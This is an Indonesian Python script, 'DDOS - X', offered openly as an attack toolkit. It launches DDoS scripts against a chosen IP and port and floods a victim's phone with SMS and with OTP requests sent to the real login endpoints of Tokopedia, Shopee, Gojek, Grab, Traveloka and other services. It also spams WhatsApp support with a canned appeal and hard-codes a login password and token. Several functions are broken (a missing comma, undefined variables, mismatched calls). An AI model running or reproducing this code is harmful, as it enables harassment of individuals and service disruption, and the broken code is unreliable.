
#!/usr/bin/env python
import os
import socket
import threading
import time
import random
import curses
import pyfiglet
import requests
import json
from getpass import getpass
import phonenumbers
import smtplib
import re
import string
import concurrent.futures
from email.mime.text import MIMEText
from phonenumbers import geocoder, carrier, timezone
from getpass import getpass
from flask import Flask, request, jsonify

R = '\033[31m'
G = '\033[32m'
Y = '\033[33m'
C = '\033[36m'
M = '\033[35m'
reset = '\033[0m'

# Data login
PASSWORD = "Rexzy123"
TOKEN = "cVbUgvgiACs1h22C3GAIWW4ApSlKce7kH3SJ0kC1QdX28QN5hO"

menu_items = [
    "DDoS Attack"
    "Kill Digital Ocean",
    "Spam Otp Combo",
    "Spam Sms",
    "Spam Ripot Wa",
    "Cek Website",
    "Keluar"
]

def attack_web():
    target = input("Masukkan URL/IP target: ")
    jumlah = input("Masukkan jumlah reqauest:") or "100"

    print("\nPilih mode serangan:")
    print("1. ddos attack v1")
    mode = input("Pilih mode : ").strip()

    print(f"\nMenyerang {target} dengan {jumlah} permintaan...")

    if mode == "1":
        os.system(f"python mati.py {target} {jumlah}")
    else:
        print("Mode tidak valid.")

def cek_web():
        os.system(f"python over.py {target} {jumlah}")

def ddos_ip_port():
    print(f"{G}Gunakan dengan bijak!{reset}")
    ip = input(f"{Y}Masukkan IP target       : {reset}")
    port = int(input(f"{Y}Masukkan port (min 80)   : {reset}"))
    turbo = int(input(f"{Y}Masukkan turbo (min 135) : {reset}"))

    if port < 80 or turbo < 135:
        print(f"{R}Port harus ≥ 80 dan Turbo harus ≥ 135!{reset}")
        return  

    print(f"{C}Menjalankan kill.py dengan IP: -s {ip}, Port: -p {port}, Turbo: -t {turbo}{reset}")
    time.sleep(1)
    os.system(f"python kill.py -s {ip} -p {port} -t {turbo}")

def kirim_ripot():
    os.system("clear")
    print(f"{G}📧 Kirim laporan ke support WhatsApp")
    pengirim = input(f"{G}Masukkan Gmail kamu: ")
    sandi = input(f"{G}Masukkan password Gmail (gunakan App Password jika 2FA): ")
    isi = input(f"{G}Tulis isi laporan kamu:\n>> ")

    target = "support@support.whatsapp.com"
    subject = "Halo tim WhatsApp, saya ingin mengajukan banding untuk akun saya yang terkena banned permanen. Nomor saya adalah +6285705607453. Saya tidak merasa melanggar ketentuan apa pun dan menggunakan WhatsApp hanya untuk komunikasi pribadi. Mohon pertimbangannya untuk mengaktifkan kembali akun saya. Terima kasih."
    msg = MIMEText(isi)
    msg['Subject'] = subject
    msg['From'] = pengirim
    msg['To'] = target

    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.login(pengirim, sandi)
        smtp_server.sendmail(pengirim, target, msg.as_string())
        smtp_server.quit()
        print(f"{G}\n✅ Laporan berhasil dikirim.")
    except:
        print(f"{R}\n❌ Gagal mengirim. Cek email dan password.")

    input(f"{G}\nTekan Enter untuk kembali ke menu...")

def spam_sms():
    os.system("clear")
    print(f"{G}📱 Mengirim SMS real-time ke aplikasi SMS target (via SIM){reset}")

    if not os.path.exists("/data/data/com.termux/files/usr/bin/termux-sms-send"):
        print(f"{R}✖ termux-sms-send tidak ditemukan! Install dengan: pkg install termux-api{reset}")
        return

    target = input(f"{Y}Masukkan nomor target (08xxx): {reset}").strip()
    if target.startswith("08"):
        target = "62" + target[1:]

    jumlah = int(input(f"{Y}Jumlah SMS: {reset}") or "1")

    print(f"{C}⏱ Mengirim {jumlah} pesan ke {target} tanpa delay...{reset}")
    for i in range(jumlah):
        otp = random.randint(100000, 999999)
        pesan = f"<#> Kode verifikasi Anda: {otp}\nGunakan kode ini hanya di aplikasi resmi DDosX\n"
        kode = os.system(f'termux-sms-send -n {target} "{pesan}"')
        if kode == 0:
            print(f"{G}[✓] SMS ke-{i+1} terkirim ke {target}{reset}")
        else:
            print(f"{R}[✗] Gagal kirim SMS ke-{i+1}{reset}")

def spam_otp_combo(stdscr):
    curses.endwin()
    os.system("clear")
    print("📲 SPAM OTP COMBO [WA TARGET]")
    nomor = input("Masukkan nomor (contoh 08xxxx): ")
    if nomor.startswith("08"):
        nomor = "62" + nomor[1:]

    total = int(input("Berapa kali spam per layanan (misal 3): "))
    print(f"\n🚀 Mulai spam ke {nomor} dari semua layanan...\n")

    def tokopedia():
        for i in range(total):
            try:
                headers = {
                    "User-Agent": "okhttp/3.12.1",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = {
                    "phone": nomor,
                    "old_phone": nomor,
                    "email": "",
                    "old_email": "",
                    "password": "",
                    "keep_login": "true"
                }
                r = requests.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa", data=data, headers=headers)
                if "otp_token" in r.text:
                    print(f"[Tokopedia {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Tokopedia {i+1}] ⚠️ Gagal/batas")
            except:
                print(f"[Tokopedia {i+1}] ❌ Error")
            time.sleep(2)

    def shopee():
        for i in range(total):
            try:
                url = "https://shopee.co.id/api/v2/authentication/send_otp"
                headers = {
                    "User-Agent": "Shopee Android",
                    "Content-Type": "application/json"
                }
                payload = {
                    "phone": "+" + nomor,
                    "phone_country": "ID",
                    "method": "whatsapp"
                }
                r = requests.post(url, data=json.dumps(payload), headers=headers)
                if r.status_code == 200:
                    print(f"[Shopee {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Shopee {i+1}] ⚠️ Gagal/batas")
            except:
                print(f"[Shopee {i+1}] ❌ Error")
            time.sleep(2)

    def jdid():
        for i in range(total):
            try:
                url = "https://api.jd.id/regService/sendCode"
                headers = {
                    "User-Agent": "JD4Android",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = f"phone={nomor}&type=1"
                r = requests.post(url, data=data, headers=headers)
                if "Success" in r.text or r.status_code == 200:
                    print(f"[JD.ID {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[JD.ID {i+1}] ⚠️ Gagal/batas")
            except:
                print(f"[JD.ID {i+1}] ❌ Error")
            time.sleep(2)

    def bukalapak():
        for i in range(total):
            try:
                url = "https://api.bukalapak.com/v2/authentication.json"
                headers = {
                    "User-Agent": "okhttp/3.10.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = f"phone={nomor}"
                r = requests.post(url, headers=headers, data=data)
                if r.status_code == 200:
                    print(f"[Bukalapak {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Bukalapak {i+1}] ⚠️ Gagal/batas")
            except:
                print(f"[Bukalapak {i+1}] ❌ Error")
            time.sleep(2)

    def lazada():
        for i in range(total):
            try:
                r = requests.post(
                    "https://member.lazada.co.id/user/api/sendOtp",
                    json={"mobile": nomor, "type": "register"},
                    headers={"Content-Type": "application/json"}
                )
                if r.status_code == 200:
                    print(f"[Lazada {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Lazada {i+1}] ⚠️ Gagal")
            except:
                print(f"[Lazada {i+1}] ❌ Error")
            time.sleep(2)

    def tokocash():
        for i in range(total):
            try:
                r = requests.post(
                    "https://tokocash.tokopedia.com/v1/init",
                    data={"msisdn": nomor}
                )
                if r.status_code == 200:
                    print(f"[Tokocash {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Tokocash {i+1}] ⚠️ Gagal")
            except:
                print(f"[Tokocash {i+1}] ❌ Error")
            time.sleep(2)

    def grab():
        for i in range(total):
            try:
                r = requests.post(
                    "https://api.grab.com/grabid/v1/phone/otp",
                    json={"phone_number": f"+{nomor}", "country_code": "ID", "method": "SMS"},
                    headers={"Content-Type": "application/json"}
                )
                if "challengeID" in r.text:
                    print(f"[Grab {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Grab {i+1}] ⚠️ Gagal")
            except:
                print(f"[Grab {i+1}] ❌ Error")
            time.sleep(2)

    def gojek():
        for i in range(total):
            try:
                r = requests.post(
                    "https://api.gojekapi.com/v5/customers/phone/verify",
                    json={"phone": f"+{nomor}"},
                    headers={
                        "X-AppVersion": "3.46.2",
                        "X-Uniqueid": str(random.randint(1000000, 9999999)),
                        "Content-Type": "application/json"
                    }
                )
                if "token" in r.text or r.status_code == 200:
                    print(f"[Gojek {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Gojek {i+1}] ⚠️ Gagal")
            except:
                print(f"[Gojek {i+1}] ❌ Error")
            time.sleep(2)

    def traveloka():
        for i in range(total):
            try:
                r = requests.post(
                    "https://api.traveloka.com/v1/otp/send",
                    json={"phone_number": nomor},
                    headers={"Content-Type": "application/json"}
                )
                if r.status_code == 200:
                    print(f"[Traveloka {i+1}] ✅ OTP terkirim")
                else:
                    print(f"[Traveloka {i+1}] ⚠️ Gagal")
            except:
                print(f"[Traveloka {i+1}] ❌ Error")
            time.sleep(2)

    # Jalankan semua layanan
    try:
        tokopedia()
        shopee()
        jdid()
        bukalapak()
        lazada()
        tokocash()
        grab()
        gojek()
        traveloka()
    except Exception as e:
        print(f"\n❌ Terjadi kesalahan umum: {e}")

    input("\nSelesai! Tekan Enter untuk kembali...")

# Fungsi menu pilihan
def handle_selection(idx, stdscr):
    stdscr.clear()
    if idx == 0:
       attack_web(stdscr)
    elif idx == 1:
        ddos_ip_port(stdscr)
    elif idx == 2:
        spam_otp_combo(stdscr)
    elif idx == 3:   
        spam_sms(stdscr)
    elif idx == 4:
        kirim_ripot(stdscr)
    elif idx == 5:
        cek_web(stdscr)
    elif idx == 6:
        exit()

def draw_menu(stdscr, selected_idx):
    stdscr.clear()
    curses.curs_set(0)  # Sembunyikan kursor

    # Pastikan warna diinisialisasi
    curses.start_color()
    curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_MAGENTA)
    curses.init_pair(2, curses.COLOR_CYAN, curses.COLOR_BLACK)

    # Cegah error jika terminal terlalu kecil
    height, width = stdscr.getmaxyx()
    if height < 24 or width < 60:
        stdscr.addstr(0, 0, "Tolong perbesar terminal kamu!", curses.color_pair(1))
        stdscr.refresh()
        stdscr.getch()
        return

    # Tampilkan judul
    title = pyfiglet.figlet_format("DDOS - X", font="slant")  # Gunakan font 'slant' bukan 'slat'
    for i, line in enumerate(title.splitlines()):
        stdscr.addstr(1 + i, 2, line, curses.color_pair(2))

    stdscr.addstr(8, 2, "Creator : Rexzy Official", curses.A_BOLD)
    stdscr.addstr(10, 2, "Gunakan panah atas/bawah dan Enter", curses.color_pair(2))

    for idx, item in enumerate(menu_items):
        x = 12 + idx
        if idx == selected_idx:
            stdscr.attron(curses.color_pair(1))
            stdscr.addstr(x, 4, f"> {item}")
            stdscr.attroff(curses.color_pair(1))
        else:
            stdscr.addstr(x, 6, item)

    stdscr.refresh()

def login():
    os.system("clear")
    print("="*40)
    print("  🔒 LOGIN - TOOLS DDOS - X 🔒")
    print("="*40)

    # Tampilkan prompt biasa, tapi beri warna hanya saat mengetik input
    print("Masukkan Password: ", end="", flush=True)
    pw = getpass("\033[32m")  # Hijau hanya saat input

    print("Masukkan Token   : ", end="", flush=True)
    token = getpass("\033[36m")  # Cyan hanya saat input

    print("\033[0m")  # Reset warna ke default

    if pw != PASSWORD or token != TOKEN:
        print("\n\033[31mAkses ditolak! Password atau token salah.\033[0m")
        exit()
    else:
        print("\n\033[32mLogin berhasil!\033[0m")
        time.sleep(1)

def main(stdscr):
    curses.curs_set(0)
    selected_idx = 0

    while True:
        draw_menu(stdscr, selected_idx)
        key = stdscr.getch()

        if key == curses.KEY_UP:
            selected_idx = (selected_idx - 1) % len(menu_items)
        elif key == curses.KEY_DOWN:
            selected_idx = (selected_idx + 1) % len(menu_items)
        elif key == curses.KEY_ENTER or key in [10, 13]:
            handle_selection(selected_idx, stdscr)
            time.sleep(1)

if __name__ == "__main__":
    login()
    curses.wrapper(main)
